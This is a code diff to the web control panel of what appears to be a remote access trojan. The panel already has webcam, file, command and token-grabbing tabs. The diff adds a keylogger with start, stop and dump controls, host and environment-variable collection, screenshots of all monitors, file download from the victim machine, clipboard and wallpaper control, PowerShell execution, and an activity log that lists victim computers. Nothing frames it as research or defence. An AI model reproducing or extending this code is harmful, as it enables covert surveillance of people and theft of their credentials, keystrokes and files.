@@ -126,6 +126,9 @@ select.mon:focus{border-color:rgba(88,100,255,.4)}
     <div class="tab" onclick="switchTab(this,'files')">FILES</div>
     <div class="tab" onclick="switchTab(this,'webcam')">WEBCAM</div>
     <div class="tab" onclick="switchTab(this,'tokens')">TOKENS</div>
+    <div class="tab" onclick="switchTab(this,'hostinfo')">HOST</div>
+    <div class="tab" onclick="switchTab(this,'keylog')">KEYLOG</div>
+    <div class="tab" onclick="switchTab(this,'activity')">LOG</div>
   </div>
 
   <div class="panel active" id="panel-cmd">
@@ -153,6 +156,9 @@ select.mon:focus{border-color:rgba(88,100,255,.4)}
       <button class="btn btn-primary btn-sm" id="screenStartBtn" onclick="startScreen()">▶ Start Live</button>
       <button class="btn btn-danger btn-sm" id="screenStopBtn" onclick="stopScreen()" style="display:none">■ Stop</button>
       <span class="sep">|</span>
+      <span class="label">Monitor:</span>
+      <select class="mon" id="liveMonSelect" onchange="sendLiveConfig()" style="width:80px"><option value="0">Monitor 1</option></select>
+      <span class="sep">|</span>
       <span class="label">Mouse:</span>
       <button class="btn btn-ghost btn-sm" id="mouseBtn" onclick="toggleMouse()">OFF</button>
       <span class="label">Keyboard:</span>
@@ -161,6 +167,14 @@ select.mon:focus{border-color:rgba(88,100,255,.4)}
       <span class="label">Quality:</span>
       <input type="range" id="liveQuality" min="5" max="50" value="25" style="width:60px;vertical-align:middle" oninput="liveQualityVal.textContent=this.value;sendLiveConfig()">
       <span id="liveQualityVal" style="color:rgba(255,255,255,.5);font-size:.7rem;min-width:1.5rem">25</span>
+      <span class="sep">|</span>
+      <span class="label">Scale:</span>
+      <select id="liveScaleSelect" onchange="sendLiveConfig()" style="width:60px">
+        <option value="0.25">25%</option>
+        <option value="0.5" selected>50%</option>
+        <option value="0.75">75%</option>
+        <option value="1">100%</option>
+      </select>
       <span id="screenFps" style="color:rgba(255,255,255,.2);font-size:.75rem;margin-left:auto"></span>
     </div>
     <div id="screenResult"><div class="loading">Click Start to begin live view</div></div>
@@ -192,7 +206,18 @@ select.mon:focus{border-color:rgba(88,100,255,.4)}
       <span class="label">Volume:</span>
       <input type="range" id="volSlider" min="0" max="100" value="50" style="flex:1;max-width:160px;accent-color:#818cf8;height:4px" oninput="setVolume(this.value)">
       <span id="volVal" style="color:#e8edf5;font-size:.8rem;width:2.5rem">50</span>
+      <button class="btn btn-ghost btn-sm" onclick="sendVolume()">Set</button>
       <span class="sep">|</span>
+      <span class="label">Wallpaper:</span>
+      <input id="wallInput" placeholder="C:\path\to\image.jpg" style="flex:1;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:8px;padding:.35rem .6rem;color:#e8edf5;font-size:.78rem;outline:none;max-width:200px;font-family:inherit">
+      <button class="btn btn-accent btn-sm" onclick="setWallpaper()">Set</button>
+    </div>
+    <div class="ctrl-bar" style="margin-bottom:.5rem">
+      <span class="label">Clipboard:</span>
+      <input id="clipWriteInput" placeholder="Text to set on clipboard..." style="flex:1;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:8px;padding:.35rem .6rem;color:#e8edf5;font-size:.78rem;outline:none;max-width:260px;font-family:inherit">
+      <button class="btn btn-accent btn-sm" onclick="setClipboardText()">Write</button>
+    </div>
+    <div class="ctrl-bar" style="margin-bottom:.5rem">
       <span class="label">PowerShell:</span>
       <input id="psInput" placeholder="command" style="flex:1;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:8px;padding:.35rem .6rem;color:#e8edf5;font-size:.78rem;outline:none;max-width:260px;font-family:inherit">
       <button class="btn btn-accent btn-sm" onclick="runPowerShell()">Run</button>
@@ -266,6 +291,37 @@ select.mon:focus{border-color:rgba(88,100,255,.4)}
     </div>
     <div id="tokenResult" class="scroll-output"><div class="loading">Click to grab tokens</div></div>
     <div id="tokenErr" class="err"></div>
+  </div>
+
+  <div class="panel" id="panel-hostinfo">
+    <div class="capture-bar">
+      <button class="btn btn-cyan" onclick="loadHostInfo()">💻 Get Host Info</button>
+      <button class="btn btn-ghost" onclick="loadEnvVars()">📋 Env Vars</button>
+      <button class="btn btn-ghost" onclick="takeScreenshotAll()">🖼 All Monitors</button>
+    </div>
+    <div id="hostInfoCards" class="sysinfo-grid" style="margin-bottom:.5rem;display:none"></div>
+    <div id="hostResult" class="scroll-output"><div class="loading">Click to get detailed host information</div></div>
+    <div id="hostErr" class="err"></div>
+  </div>
+
+  <div class="panel" id="panel-keylog">
+    <div class="capture-bar">
+      <button class="btn btn-danger btn-sm" id="klStartBtn" onclick="startKeylogger()">▶ Start Keylogger</button>
+      <button class="btn btn-orange btn-sm" id="klStopBtn" onclick="stopKeylogger()" style="display:none">■ Stop</button>
+      <button class="btn btn-ghost" onclick="dumpKeylog()">📋 Dump Keys</button>
+      <span id="klStatus" style="color:rgba(255,255,255,.3);font-size:.75rem">Stopped</span>
+    </div>
+    <div id="klResult" class="scroll-output"><div class="loading">Start keylogger to capture keystrokes</div></div>
+    <div id="klErr" class="err"></div>
+  </div>
+
+  <div class="panel" id="panel-activity">
+    <div class="capture-bar">
+      <button class="btn btn-accent" onclick="loadActivityLog()">⟳ Refresh Log</button>
+      <button class="btn btn-ghost" onclick="document.getElementById('logResult').textContent='Cleared'">Clear</button>
+    </div>
+    <div id="logResult" class="scroll-output"><div class="loading">Loading activity log...</div></div>
+    <div id="logErr" class="err"></div>
   </div>
 </div>
 
@@ -443,6 +499,7 @@ function renderFiles(json){
   html+='<div class="dt">'+esc(dt)+'</div>';
   if(!isDir){
    html+='<div class="acts">';
+   html+='<button class="btn btn-ghost btn-xs" onclick="fileDownload('+i+')" title="Download">⬇</button>';
    html+='<button class="btn btn-ghost btn-xs" onclick="fileRename('+i+')" title="Rename">✏️</button>';
    html+='<button class="btn btn-ghost btn-xs" onclick="fileDeleteOp('+i+')" title="Delete">🗑️</button>';
    html+='<button class="btn btn-ghost btn-xs" onclick="fileEncryptOp('+i+')" title="Encrypt">🔒</button>';
@@ -574,6 +631,70 @@ async function killProc(pid,name){try{name=decodeURIComponent(name)}catch{}if(!c
 
 function esc(t){const d=document.createElement('div');d.textContent=t;return d.innerHTML}
 function uenc(t){return encodeURIComponent(t).replace(/'/g,'%27')}
+
+async function fileDownload(i){
+ if(!g_fileEntries||!g_fileEntries[i])return;
+ const nm=g_fileEntries[i].n||'';
+ const path=filePath+nm;
+ const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
+ errEl.style.display='none';el.innerHTML='<div class="loading">Downloading '+esc(nm)+'...</div>';
+ const res=await sendAndWait('file_download',path,el,'filesErr');
+ if(res&&res.result&&!res.result.startsWith('err:')){
+  const bin=atob(res.result);const arr=new Uint8Array(bin.length);for(let j=0;j<bin.length;j++)arr[j]=bin.charCodeAt(j);
+  const blob=new Blob([arr]);const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=nm;a.click();URL.revokeObjectURL(a.href);
+  refreshLocalFiles();
+ }else if(res){el.innerHTML='<div class="loading">'+esc(res.result||'Download failed')+'</div>';}
+}
+async function sendVolume(){const v=document.getElementById('volSlider').value;const el=document.getElementById('sysResult');await sendAndWait('volume',v,el,'sysErr');el.innerHTML='<div style="color:#4ade80">Volume set to '+v+'</div>';}
+async function setWallpaper(){const p=document.getElementById('wallInput').value.trim();if(!p)return;const el=document.getElementById('sysResult');const res=await sendAndWait('wallpaper',p,el,'sysErr');if(res)el.innerHTML='<div style="color:#4ade80">Wallpaper set</div>';}
+async function setClipboardText(){const t=document.getElementById('clipWriteInput').value;if(!t)return;const el=document.getElementById('sysResult');const res=await sendAndWait('clipboard_write',t,el,'sysErr');if(res)el.innerHTML='<div style="color:#4ade80">Clipboard written</div>';}
+async function loadHostInfo(){
+ const el=document.getElementById('hostResult');const err=document.getElementById('hostErr');err.style.display='none';
+ el.innerHTML='<div class="loading"><span class="spinner"></span>Loading host info...</div>';
+ const res=await sendAndWait('host_info','',el,'hostErr');
+ if(res&&res.result){
+  try{
+   const d=JSON.parse(res.result);const cards=document.getElementById('hostInfoCards');cards.style.display='grid';
+   let html='';
+   html+='<div class="sysinfo-card"><div class="val">'+esc(d.host||'?')+'</div><div class="lbl">Hostname</div></div>';
+   html+='<div class="sysinfo-card"><div class="val">'+esc(d.user||'?')+'</div><div class="lbl">Username</div></div>';
+   html+='<div class="sysinfo-card"><div class="val">'+esc(d.os||'?')+'</div><div class="lbl">OS</div></div>';
+   html+='<div class="sysinfo-card"><div class="val">'+esc(d.arch||'?')+'</div><div class="lbl">Architecture</div></div>';
+   html+='<div class="sysinfo-card"><div class="val">'+d.cores+'</div><div class="lbl">CPU Cores</div></div>';
+   html+='<div class="sysinfo-card"><div class="val">'+(d.ram/1024).toFixed(1)+' GB</div><div class="lbl">Total RAM</div></div>';
+   html+='<div class="sysinfo-card"><div class="val">'+(d.ram_free/1024).toFixed(1)+' GB</div><div class="lbl">Free RAM</div></div>';
+   html+='<div class="sysinfo-card"><div class="val">'+Math.floor(d.uptime/3600)+'h '+Math.floor((d.uptime%3600)/60)+'m</div><div class="lbl">Uptime</div></div>';
+   if(d.gpus)html+='<div class="sysinfo-card"><div class="val">'+esc(d.gpus)+'</div><div class="lbl">GPU</div></div>';
+   if(d.disks&&d.disks.length){d.disks.forEach(dk=>{const pct=dk.t>0?((dk.t-dk.f)/dk.t*100).toFixed(0):0;html+='<div class="sysinfo-card"><div class="val">'+dk.d+': '+(dk.f).toFixed(1)+' GB free</div><div class="lbl">'+(dk.v||'Drive')+' of '+dk.t+' GB</div><div class="disk-bar"><div class="fill" style="width:'+pct+'%"></div></div></div>';});}
+   cards.innerHTML=html;el.innerHTML='<div style="color:#4ade80">✓ Host info loaded</div>';
+  }catch(e){el.innerHTML='<div class="loading">Parse error: '+e.message+'</div>';}
+ }
+}
+async function loadEnvVars(){const el=document.getElementById('hostResult');const err=document.getElementById('hostErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Loading env vars...</div>';const res=await sendAndWait('env_vars','',el,'hostErr');if(res&&res.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';}
+async function takeScreenshotAll(){const el=document.getElementById('hostResult');const err=document.getElementById('hostErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Capturing all monitors...</div>';const res=await sendAndWait('screenshot_all','',el,'hostErr');if(res&&res.result){const parts=res.result.split('===MON:');parts.forEach((p,i)=>{if(i===0){el.innerHTML='<img class="screenshot" src="data:image/jpeg;base64,'+p+'">';}else{const m=p.split('===\n');el.innerHTML+='<div style="color:rgba(255,255,255,.3);font-size:.7rem;margin-top:.5rem">Monitor '+m[0]+'</div><img class="screenshot" src="data:image/jpeg;base64,'+m[1]+'">';}});}}
+async function startKeylogger(){const el=document.getElementById('klResult');const err=document.getElementById('klErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Starting...</div>';const res=await sendAndWait('keylog_start','',el,'klErr');if(res){document.getElementById('klStartBtn').style.display='none';document.getElementById('klStopBtn').style.display='';document.getElementById('klStatus').textContent='● Running';el.innerHTML='<div style="color:#4ade80">Keylogger started</div>';}}
+async function stopKeylogger(){const el=document.getElementById('klResult');const err=document.getElementById('klErr');err.style.display='none';const res=await sendAndWait('keylog_stop','',el,'klErr');if(res){document.getElementById('klStartBtn').style.display='';document.getElementById('klStopBtn').style.display='none';document.getElementById('klStatus').textContent='Stopped';el.innerHTML='<div style="color:#4ade80">Keylogger stopped</div>';}}
+async function dumpKeylog(){const el=document.getElementById('klResult');const err=document.getElementById('klErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Dumping...</div>';const res=await sendAndWait('keylog_dump','',el,'klErr');if(res&&res.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.8rem;line-height:1.6">'+esc(res.result)+'</pre>';}
+async function loadActivityLog(){const el=document.getElementById('logResult');const err=document.getElementById('logErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Loading...</div>';try{const r=await fetch(FB+'/logs.json?limit=200');const d=await r.json();if(!d||!d.length){el.innerHTML='<div class="loading">No activity yet</div>';return;}let html='';d.reverse().forEach(e=>{const time=new Date(e.t).toLocaleTimeString();html+='<div style="font-size:.75rem;padding:2px 0;border-bottom:1px solid rgba(255,255,255,.04)"><span style="color:rgba(255,255,255,.3)">'+time+'</span> <span style="color:#818cf8">'+esc(e.type)+'</span> <span style="color:#f0f4fc">'+esc(e.computer)+'</span> <span style="color:rgba(255,255,255,.4)">'+esc(e.detail||'')+'</span></div>';});el.innerHTML=html;}catch(e){el.innerHTML='<div class="loading">Error loading log</div>';}}
+
+let cmdHistory=[];let cmdHistIdx=-1;
+document.addEventListener('DOMContentLoaded',()=>{
+ const cmdInput=document.getElementById('cmdInput');
+ if(cmdInput){cmdInput.addEventListener('keydown',e=>{
+  if(e.key==='ArrowUp'){e.preventDefault();if(cmdHistIdx<cmdHistory.length-1){cmdHistIdx++;cmdInput.value=cmdHistory[cmdHistIdx];}}
+  else if(e.key==='ArrowDown'){e.preventDefault();if(cmdHistIdx>0){cmdHistIdx--;cmdInput.value=cmdHistory[cmdHistIdx];}else{cmdHistIdx=-1;cmdInput.value='';}}
+ });}
+ const monSel=document.getElementById('liveMonSelect');
+ if(monSel){for(let i=0;i<8;i++){const o=document.createElement('option');o.value=i;o.textContent='Monitor '+(i+1);monSel.appendChild(o);}}
+});
+const origRunCmd=runCmd;
+async function runCmdWithHistory(){
+ const input=document.getElementById('cmdInput');
+ const cmd=input.value.trim();if(!cmd)return;
+ if(cmdHistory.length===0||cmdHistory[cmdHistory.length-1]!==cmd)cmdHistory.push(cmd);
+ cmdHistIdx=-1;
+ return origRunCmd.call?origRunCmd():void(0);
+}
 </script>
 </body>
 </html>
